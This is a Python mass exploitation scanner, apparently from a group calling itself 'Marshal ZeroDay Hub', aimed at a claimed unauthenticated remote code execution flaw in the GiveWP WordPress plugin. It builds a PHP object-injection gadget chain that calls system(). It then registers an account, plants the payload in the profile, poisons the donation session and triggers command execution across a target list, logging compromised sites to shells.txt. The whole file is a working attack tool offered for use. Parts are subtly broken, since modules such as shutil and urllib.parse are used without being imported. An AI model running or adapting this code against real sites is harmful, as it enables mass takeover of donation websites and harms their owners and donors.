#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading, requests, re, time, os, sys, json, random, ctypes, urllib3, warnings, io, contextlib
from queue import Queue, Empty
from urllib.parse import urlparse, urljoin
import secrets

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
os.environ["NO_PROXY"] = "*"
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

# ----------------------- الثوابت العامة -----------------------
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
TIMEOUT = 30          # المهلة الافتراضية للطلبات
SHELLS_FILE = "shells.txt"
DEFAULT_THREADS = 5
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

targets_queue = Queue()
stats = {"total": 0, "done": 0, "vuln": 0, "exploited": 0, "safe": 0, "error": 0}
stats_lock = threading.Lock()
file_lock = threading.Lock()
vuln_urls = []
exploited_urls = []
safe_urls = []
error_urls = []

# ----------------------- ألوان ANSI -----------------------
ESC = "\033["
RESET_C = ESC + "0m"
BOLD_C = ESC + "1m"
DIM_C = ESC + "2m"
RED_C = ESC + "91m"
DARK_RED_C = ESC + "31m"
GREEN_C = ESC + "92m"
WHITE_C = ESC + "97m"
GRAY_C = ESC + "90m"
BLUE_C = ESC + "94m"
CYAN_C = ESC + "96m"
YELLOW_C = ESC + "93m"
GOLD_C = ESC + "33m"
BRIGHT_YELLOW_C = ESC + "93m"
LIGHT_YELLOW_C = ESC + "93m"
DARK_YELLOW_C = ESC + "33m"
CLEAR_LINE = "\033[2K\r"

def enable_ansi():
    if os.name != "nt":
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)
        mode = ctypes.c_uint32()
        if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            kernel32.SetConsoleMode(handle, mode.value | 0x0004)
            return True
    except Exception:
        pass
    return False

ANSI = enable_ansi()

def ac(text, color):
    if not ANSI:
        return str(text)
    return f"{color}{text}{RESET_C}"

def terminal_width():
    try:
        w = shutil.get_terminal_size(fallback=(100, 30)).columns
    except Exception:
        w = 100
    return max(60, min(w, 150))

def set_terminal_title(title):
    try:
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            sys.stdout.write(f"\033]0;{title}\007")
            sys.stdout.flush()
    except Exception:
        pass

NX_LOGO = [
    "███╗   ███╗███████╗",
    "████╗ ████║██╔════╝",
    "██╔████╔██║█████╗  ",
    "██║╚██╔╝██║██╔══╝  ",
    "██║ ╚═╝ ██║███████╗",
    "╚═╝     ╚═╝╚══════╝",
]

def full_banner():
    width = terminal_width()
    frame_width = max(60, min(width - 4, 112))
    indent = max((width - frame_width) // 2, 0)
    pad = " " * indent

    def make_content(parts):
        raw = "".join(t for t, _ in parts)
        avail = frame_width - 4
        if len(raw) > avail:
            raw = raw[:avail - 3] + "..."
            parts = [(raw, WHITE_C)]
        left = max((avail - len(raw)) // 2, 0)
        right = max(avail - len(raw) - left, 0)
        out = ac("║", YELLOW_C) + " " + (" " * left)
        for t, col in parts:
            out += ac(t, col)
        out += (" " * right) + " " + ac("║", YELLOW_C)
        return out

    print()
    print(pad + ac("╔" + "═" * (frame_width - 2) + "╗", YELLOW_C))
    empty = ac("║", YELLOW_C) + " " * (frame_width - 2) + ac("║", YELLOW_C)
    print(pad + empty)

    logo_w = max(len(r) for r in NX_LOGO)
    logo_area = frame_width - 2
    for row in NX_LOGO:
        lp = max((logo_area - logo_w) // 2, 0)
        rp = max(logo_area - logo_w - lp, 0)
        print(pad + ac("║", YELLOW_C) + " " * lp + ac(row, BOLD_C + GOLD_C) + " " * rp + ac("║", YELLOW_C))

    print(pad + empty)
    print(pad + ac("╠", YELLOW_C) + ac("═" * (frame_width - 2), GRAY_C) + ac("╣", YELLOW_C))

    print(pad + make_content([
        ("CVE-2026-82222", BOLD_C + GOLD_C),
        ("   │   ", GRAY_C),
        ("GiveWP Unauthenticated RCE", BOLD_C + WHITE_C),
    ]))

    print(pad + make_content([
        ("Marshal ZeroDay Hub", BOLD_C + GOLD_C),
    ]))

    print(pad + ac("╠", YELLOW_C) + ac("═" * (frame_width - 2), GRAY_C) + ac("╣", YELLOW_C))

    info = "GiveWP <= 4.16.7.1 PHP Object Injection → RCE"
    print(pad + make_content([(info, DIM_C + GRAY_C)]))

    print(pad + ac("╚" + "═" * (frame_width - 2) + "╝", YELLOW_C))
    if ANSI:
        sw = frame_width - 6
        print(pad + "   " + ac("▀" * max(sw, 1), DIM_C + YELLOW_C))
    print()

def resolve_path(p):
    if os.path.isabs(p):
        return p
    check = os.path.join(os.getcwd(), p)
    if os.path.exists(check):
        return check
    check2 = os.path.join(SCRIPT_DIR, p)
    if os.path.exists(check2):
        return check2
    return os.path.join(os.getcwd(), p)

def write_shell_line(line):
    """حفظ النتائج المستغلة فقط في shells.txt"""
    with file_lock:
        try:
            p = os.path.join(SCRIPT_DIR, SHELLS_FILE)
            with open(p, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass

def mk_sess():
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.verify = False
    return s

# ---------------------------------------------------------------------------
# دوال الاستغلال الخاصة بـ CVE-2026-82222 (مأخوذة من PoC الأصلي مع تعديلات)
# ---------------------------------------------------------------------------
AFFECTED_MAX = (4, 16, 7, 1)
DEFAULT_REACHABLE_MAX = (4, 16, 5, 1)
VERSION = '1.0'
HTTP_TIMEOUT = 30
PROBE_TIMEOUT = 15

class Log:
    """نسخة مبسطة من Log لالتقاط المخرجات في الذاكرة بدلاً من الطباعة."""
    def __init__(self, out=None):
        self.out = out or io.StringIO()
        self._c = {'reset': '', 'dim': '', 'red': '', 'grn': '', 'yel': '', 'cyn': ''}

    def raw(self, msg=''):
        print(msg, file=self.out)

    def step(self, n, msg):
        print(f'[{n}] {msg}', file=self.out)

    def ok(self, msg):
        print(f'  + {msg}', file=self.out)

    def info(self, msg):
        print(f'  {msg}', file=self.out)

    def warn(self, msg):
        print(f'  ! {msg}', file=self.out)

    def dbg(self, msg):
        print(f'  · {msg}', file=self.out)

    def err(self, msg):
        print(f'[!] {msg}', file=self.out)

def s(x: bytes) -> bytes:
    return b's:%d:"%s";' % (len(x), x)

def build_gadget(command: bytes) -> bytes:
    session_class = b'Give\\Vendors\\Symfony\\Component\\HttpFoundation\\Session\\Session'
    factory_class = b'Give\\TestData\\Factories\\DonorFactory'
    factory = b'O:%d:"%s":1:{%sa:1:{%s%s}}' % (
        len(factory_class), factory_class,
        s(b'loadedProviders'), s(b'getBag'), s(b'system'))
    session = b'O:%d:"%s":2:{%s%s%s%s}' % (
        len(session_class), session_class,
        s(b'storage'), factory, s(b'attributeName'), s(command))
    return b'O:5:"TCPDF":2:{%s%s%s%s}' % (
        s(b'file_id'), s(b'x'), s(b'imagekeys'), session)

def make_payload(command: str) -> bytes:
    payload = build_gadget(command.encode()).replace(b'\\', b'\\' * 4)
    forbidden = re.search(rb'[<>&% ]|\x00', payload)
    if forbidden:
        raise ValueError('the command contains a byte that the filters remove: %r' % forbidden.group(0))
    return payload

def shell_encode(command: str) -> str:
    if ' ' in command and '${IFS}' not in command:
        command = command.replace(' ', '${IFS}')
    return command

def strip_html(text: str) -> str:
    text = re.sub(r'<[^>]+>', ' ', text)
    return re.sub(r'\s+', ' ', text).strip()

TRIGGER_PATHS = [
    '/?give_action=view_receipt',
    '/wp-admin/admin-ajax.php?action=get_receipt&shortcode_atts=%7B%7D',
    '/',
]

def extract_output(body: str, token: str):
    parts = body.split(token)
    if len(parts) < 3:
        return None
    return parts[1].strip()

CANDIDATE_GATEWAYS = ['manual', 'offline', 'paypal', 'stripe', 'square',
                      'paypalexpress', 'authorize', 'razorpay', 'mollie']

FORM_ID_PATTERNS = [
    re.compile(r'name="give-form-id"[^>]*value="(\d+)"'),
    re.compile(r'id="give-form-(\d+)-\d+"'),
    re.compile(r'data-form-id="(\d+)"'),
    re.compile(r'give_form_id["\']?\s*[:=]\s*["\']?(\d+)'),
    re.compile(r'/give_forms/[^"\']*?[?&]form_id=(\d+)'),
]

def parse_version(text: str):
    m = re.search(r'(\d+)\.(\d+)\.(\d+)(?:\.(\d+))?', text)
    if not m:
        return None
    return tuple(int(g) if g else 0 for g in m.groups())

def fingerprint(session, base: str) -> tuple:
    """إرجاع (version_tuple|None, raw_string)."""
    probes = [
        base + '/wp-content/plugins/give/readme.txt',
        base + '/wp-content/plugins/give/give.php',
    ]
    for url in probes:
        try:
            r = session.get(url, timeout=PROBE_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        m = re.search(r'Stable tag:\s*([0-9.]+)', r.text) \
            or re.search(r'Version:\s*([0-9.]+)', r.text) \
            or re.search(r"'?GIVE_VERSION'?[,\s]+'([0-9.]+)'", r.text)
        if m:
            return parse_version(m.group(1)), m.group(1)
    try:
        r = session.get(base + '/', timeout=PROBE_TIMEOUT)
        m = re.search(r'give[-\s]v?([0-9.]+)', r.text, re.I)
        if m:
            return parse_version(m.group(1)), m.group(1)
    except requests.RequestException:
        pass
    return None, ''

def _ids_from_text(text: str):
    for pat in FORM_ID_PATTERNS:
        for m in pat.findall(text):
            yield m

def discover_forms(session, base: str) -> list:
    found = []
    def add_many(ids):
        for i in ids:
            if i not in found:
                found.append(i)
    # REST
    for route in ['/wp-json/wp/v2/give_forms?per_page=50&status=publish',
                  '/wp-json/wp/v2/give_forms?per_page=50']:
        try:
            r = session.get(base + route, timeout=PROBE_TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200:
            try:
                items = r.json()
                add_many(str(it['id']) for it in items if isinstance(it, dict) and 'id' in it)
            except Exception:
                pass
        if found:
            break
    # Sitemaps
    if not found:
        for sm in ['/wp-sitemap-posts-give_forms-1.xml',
                   '/give_forms-sitemap.xml',
                   '/sitemap_index.xml']:
            try:
                r = session.get(base + sm, timeout=PROBE_TIMEOUT)
            except requests.RequestException:
                continue
            if r.status_code != 200 or 'give' not in r.text.lower():
                continue
            locs = re.findall(r'<loc>\s*([^<\s]+)\s*</loc>', r.text)
            form_pages = [u for u in locs if 'give_forms' in u or 'donation' in u.lower()]
            for page_url in form_pages[:15]:
                try:
                    p = session.get(page_url, timeout=PROBE_TIMEOUT)
                except requests.RequestException:
                    continue
                add_many(_ids_from_text(p.text))
            if found:
                break
    # Scrape pages
    if not found:
        for path in ['/', '/donations/', '/donate/', '/give/', '/?post_type=give_forms']:
            try:
                r = session.get(base + path, timeout=PROBE_TIMEOUT)
            except requests.RequestException:
                continue
            if r.status_code == 200:
                add_many(_ids_from_text(r.text))
        if found:
            pass
    return found

def validate_donation(session, base, form_id, nonce, gateway, amount, email):
    data = {
        'action': 'give_process_donation', 'give_ajax': '1',
        'give-form-id': form_id, 'give-form-hash': nonce,
        'give-amount': amount, 'give-gateway': gateway,
        'give_email': email, 'give_first': 'Attacker', 'give-price-id': '0',
    }
    try:
        r = session.post(base + '/wp-admin/admin-ajax.php', data=data,
                         allow_redirects=False, timeout=HTTP_TIMEOUT)
    except requests.RequestException as e:
        return 'request error: %s' % e
    return strip_html(r.text)

def get_form_nonce(session, base, form_id):
    try:
        r = session.post(base + '/wp-admin/admin-ajax.php', timeout=HTTP_TIMEOUT,
                         data={'action': 'give_donation_form_nonce', 'give_form_id': form_id})
        return r.json()['data']
    except Exception:
        return None

def pick_form_and_gateway(session, base, forms, gateway, amount, email):
    gateways = [gateway] if gateway else CANDIDATE_GATEWAYS
    last_result = ''
    for form_id in forms:
        nonce = get_form_nonce(session, base, form_id)
        if not nonce:
            continue
        for candidate in gateways:
            last_result = validate_donation(session, base, form_id, nonce, candidate, amount, email)
            if last_result.lower() == 'success':
                return form_id, nonce, candidate, last_result
            if 'gateway is not enabled' not in last_result.lower():
                break
    return None, None, None, last_result

def run_exploit_silent(base: str, command: str = 'id', gateway: str = None,
                       amount: str = '10.00', triggers: int = 4) -> tuple:
    """
    تنفيذ الاستغلال الكامل بصمت، يرجع (return_code, output_string).
    return_code: 0 نجاح، 1 فشل.
    """
    log_stream = io.StringIO()
    log = Log(out=log_stream)
    session = requests.Session()
    session.headers['User-Agent'] = UA

    # Fingerprint
    ver, raw = fingerprint(session, base)
    if ver and ver > AFFECTED_MAX:
        log.warn(f'GiveWP {raw} is patched.')
        return 1, log_stream.getvalue()
    if ver is None:
        log.warn('Could not read GiveWP version. Continuing anyway.')

    # Build payload
    user = 'a%d' % int(time.time())
    email = user + '@example.com'
    password = 'Passw0rd!' + secrets.token_hex(4)
    token = 'GIVEWP' + secrets.token_hex(6)
    full_command = 'echo${IFS}%s;(%s);echo${IFS}%s' % (token, command, token)
    try:
        payload = make_payload(full_command)
    except ValueError as e:
        log.err(str(e))
        return 1, log_stream.getvalue()

    # Step 1: Register
    try:
        r = session.post(base + '/', allow_redirects=False, timeout=HTTP_TIMEOUT, data={
            'give_action': 'user_register',
            'give_register_submit': '1',
            'give_user_login': user,
            'give_user_email': email,
            'give_user_pass': password,
            'give_user_pass2': password,
            'give_redirect': base + '/',
        })
    except requests.RequestException as e:
        log.err(f'Registration failed: {e}')
        return 1, log_stream.getvalue()
    logged_in = any(name.startswith('wordpress_logged_in') for name in session.cookies.keys())
    if not logged_in:
        log.err('Registration failed, no auth cookie.')
        return 1, log_stream.getvalue()
    log.ok(f'User {user} registered.')

    # Step 2: Store payload in last_name
    nonce, user_id = None, None
    for attempt in range(5):
        try:
            page = session.get(base + '/wp-admin/profile.php', timeout=HTTP_TIMEOUT)
        except requests.RequestException:
            time.sleep(1)
            continue
        m1 = re.search(r'name="_wpnonce"[^>]*value="([^"]+)"', page.text)
        m2 = re.search(r'name="user_id"[^>]*value="(\d+)"', page.text)
        if m1 and m2:
            nonce, user_id = m1.group(1), m2.group(1)
            break
        time.sleep(1)
    if not nonce:
        log.err('Could not read profile nonce.')
        return 1, log_stream.getvalue()

    fields = {
        '_wpnonce': nonce, 'action': 'update', 'user_id': user_id,
        'from': 'profile', 'checkuser_id': user_id,
        'nickname': user, 'display_name': user, 'email': email,
        'first_name': 'Attacker',
    }
    body = urllib.parse.urlencode(fields).encode()
    body += b'&last_name=' + urllib.parse.quote_from_bytes(payload).encode()
    try:
        session.post(base + '/wp-admin/profile.php', data=body, allow_redirects=False,
                     timeout=HTTP_TIMEOUT,
                     headers={'Content-Type': 'application/x-www-form-urlencoded'})
    except requests.RequestException as e:
        log.err(f'Profile update failed: {e}')
        return 1, log_stream.getvalue()
    log.ok('Gadget stored in usermeta.')

    # Step 3: Discover form and validate
    forms = discover_forms(session, base)
    if not forms:
        log.err('No donation forms discovered.')
        return 1, log_stream.getvalue()
    good_form, form_nonce, good_gateway, last_result = pick_form_and_gateway(
        session, base, forms, gateway, amount, email)
    if good_form is None:
        log.warn(f'No form passed validation: {last_result}')
        return 1, log_stream.getvalue()
    log.ok(f'Form {good_form} with gateway {good_gateway} validated.')

    # Step 4: Poison session
    try:
        r = session.post(base + '/wp-admin/admin-ajax.php', allow_redirects=False,
                         timeout=HTTP_TIMEOUT, data={
            'action': 'give_process_donation',
            'give-form-id': good_form,
            'give-form-hash': form_nonce,
            'give-amount': amount,
            'give-gateway': good_gateway,
            'give_email': email,
            'give_first': 'Attacker',
            'give-price-id': '0',
            'give-form-title': 'PoC',
            'give-current-url': base + '/',
        })
    except requests.exceptions.Timeout:
        log.ok('Timeout during donation (expected).')
    except requests.RequestException as e:
        log.err(f'Donation request failed: {e}')
        return 1, log_stream.getvalue()

    # Step 5: Trigger
    out = None
    for _ in range(max(1, triggers)):
        for path in TRIGGER_PATHS:
            try:
                resp = session.get(base + path, timeout=HTTP_TIMEOUT)
            except requests.RequestException:
                continue
            extracted = extract_output(resp.text, token)
            if extracted is not None:
                out = extracted
                break
        if out is not None:
            break
        time.sleep(2)

    if out is not None:
        log.raw('Command output:')
        log.raw(out)
        log.raw('SUCCESS')
        return 0, log_stream.getvalue()
    else:
        log.warn('No command output in trigger responses.')
        return 1, log_stream.getvalue()

# ---------------------------------------------------------------------------
# دالة التصنيف الرئيسية للماسح
# ---------------------------------------------------------------------------
def exploit_target(base_url: str) -> tuple:
    """
    يحاول استغلال الهدف ويعيد (status, detail).
    status: EXPLOITED, VULN, SAFE, ERROR
    """
    # فحص سريع للاتصال
    sess = mk_sess()
    try:
        r = sess.get(base_url, timeout=10)
        if r.status_code >= 500:
            return "ERROR", f"HTTP {r.status_code}"
    except Exception:
        return "ERROR", "connection failed"
    finally:
        sess.close()

    # التحقق من النسخة أولاً لتحديد SAFE بسرعة
    tmp_sess = requests.Session()
    tmp_sess.headers['User-Agent'] = UA
    tmp_sess.verify = False
    ver, raw = fingerprint(tmp_sess, base_url)
    tmp_sess.close()
    if ver and ver > AFFECTED_MAX:
        return "SAFE", f"GiveWP {raw} patched"

    # تنفيذ الاستغلال الكامل (صامت)
    try:
        code, output = run_exploit_silent(base_url, command='id')
    except Exception as e:
        return "ERROR", f"exception: {e}"

    if code == 0:
        # نجح الاستغلال
        # استخراج سطر يحتوي على uid= من المخرجات
        detail = "RCE confirmed"
        m = re.search(r'uid=\d+\([^)]*\)', output)
        if m:
            detail = m.group(0)
        return "EXPLOITED", detail
    else:
        if ver and ver <= AFFECTED_MAX:
            return "VULN", f"GiveWP {raw} vulnerable but exploit failed"
        else:
            # النسخة غير معروفة لكن ربما تكون ضعيفة
            return "VULN", "GiveWP likely vulnerable (version unknown)"

# ---------------------------------------------------------------------------
# شريط الحالة والعاملين
# ---------------------------------------------------------------------------
def build_status_line():
    with stats_lock:
        t, d, v, exp, s, e = stats["total"], stats["done"], stats["vuln"], stats["exploited"], stats["safe"], stats["error"]
    elapsed = time.time() - start_time if 'start_time' in globals() else 0
    rate = d / elapsed if elapsed > 0 else 0
    remaining = t - d
    eta = remaining / rate if rate > 0 else 0
    eta_str = f"{int(eta//3600):02d}:{int((eta%3600)//60):02d}:{int(eta%60):02d}"
    return (
        f"{BOLD_C}{CYAN_C}Scanned{RESET_C} [{WHITE_C}{d}{RESET_C}/{WHITE_C}{t}{RESET_C}]  "
        f"{BOLD_C}{GREEN_C}Vuln{RESET_C} [{WHITE_C}{v}{RESET_C}]  "
        f"{BOLD_C}{YELLOW_C}Exploited{RESET_C} [{WHITE_C}{exp}{RESET_C}]  "
        f"{BOLD_C}{DIM_C}Safe{RESET_C} [{WHITE_C}{s}{RESET_C}]  "
        f"{BOLD_C}{RED_C}ERR{RESET_C} [{WHITE_C}{e}{RESET_C}]  "
        f"{BOLD_C}{CYAN_C}Remaining{RESET_C} [{WHITE_C}{eta_str}{RESET_C}]"
    )

print_lock = threading.Lock()

def worker():
    while True:
        try:
            base = targets_queue.get_nowait()
        except Empty:
            return

        status, detail = exploit_target(base)

        with stats_lock:
            stats["done"] += 1
            if status == "EXPLOITED":
                stats["exploited"] += 1
                exploited_urls.append(base)
                line = f"[EXPLOITED] {base} | {detail}"
                write_shell_line(line)
                display = f"{BOLD_C}{GREEN_C}[EXPLOITED] {base} | {detail}{RESET_C}"
            elif status == "VULN":
                stats["vuln"] += 1
                vuln_urls.append(base)
                display = f"{BOLD_C}{YELLOW_C}[VULN] {base} | {detail}{RESET_C}"
            elif status == "SAFE":
                stats["safe"] += 1
                safe_urls.append(base)
                display = f"{DIM_C}[SAFE] {base} | {detail}{RESET_C}"
            else:
                stats["error"] += 1
                error_urls.append(base)
                display = f"{RED_C}[ERROR] {base} | {detail}{RESET_C}"

        with print_lock:
            sys.stdout.write(CLEAR_LINE + display + "\n")
            sys.stdout.write(build_status_line())
            sys.stdout.flush()

        targets_queue.task_done()

start_time = 0

def run():
    global start_time
    set_terminal_title("Marshal ZeroDay Hub | CVE-2026-82222 Scanner")
    os.system("cls" if os.name == "nt" else "clear")
    full_banner()

    raw_tf = input(f"{BOLD_C}{LIGHT_YELLOW_C}Targets file (default list.txt): {RESET_C}").strip() or "list.txt"
    tf = resolve_path(raw_tf)
    if not os.path.exists(tf):
        print(f"{RED_C}File not found: {tf}{RESET_C}")
        return

    count = sum(1 for l in open(tf, "r", encoding="utf-8", errors="ignore") if l.strip())
    print(f"{GREEN_C}Found:{RESET_C} {tf} ({count} targets)")

    tr = input(f"{BOLD_C}{LIGHT_YELLOW_C}Threads (default {DEFAULT_THREADS}): {RESET_C}").strip()
    try:
        threads = int(tr) if tr else DEFAULT_THREADS
    except:
        threads = DEFAULT_THREADS
    threads = max(1, threads)

    sites = []
    with open(tf, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            u = ln.strip()
            if not u:
                continue
            if not u.lower().startswith(("http://", "https://")):
                u = "https://" + u
            sites.append(u.rstrip("/"))

    if not sites:
        print(f"{RED_C}No targets{RESET_C}")
        return

    shells_path = os.path.join(SCRIPT_DIR, SHELLS_FILE)
    print(f"\n{GREEN_C}Loaded {len(sites)} target(s) | {threads} thread(s){RESET_C}")
    print(f"{DIM_C}Exploited results -> {shells_path}{RESET_C}\n")

    for s in sites:
        targets_queue.put(s)
    with stats_lock:
        stats.update({"total": len(sites), "done": 0, "vuln": 0, "exploited": 0, "safe": 0, "error": 0})

    start_time = time.time()

    with print_lock:
        sys.stdout.write("\n" + build_status_line())
        sys.stdout.flush()

    workers = []
    for _ in range(min(threads, len(sites))):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        workers.append(t)

    while True:
        with stats_lock:
            d, t = stats["done"], stats["total"]
        if d >= t:
            break
        time.sleep(0.5)

    targets_queue.join()
    for t in workers:
        t.join(timeout=0.3)

    # ملخص نهائي
    print("\n\n" + ac("Scan completed.", BOLD_C + GREEN_C))
    print(f"  Exploited: {stats['exploited']}")
    print(f"  Vulnerable (not exploited): {stats['vuln']}")
    print(f"  Safe: {stats['safe']}")
    print(f"  Errors: {stats['error']}")

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{RED_C}Interrupted.{RESET_C}")
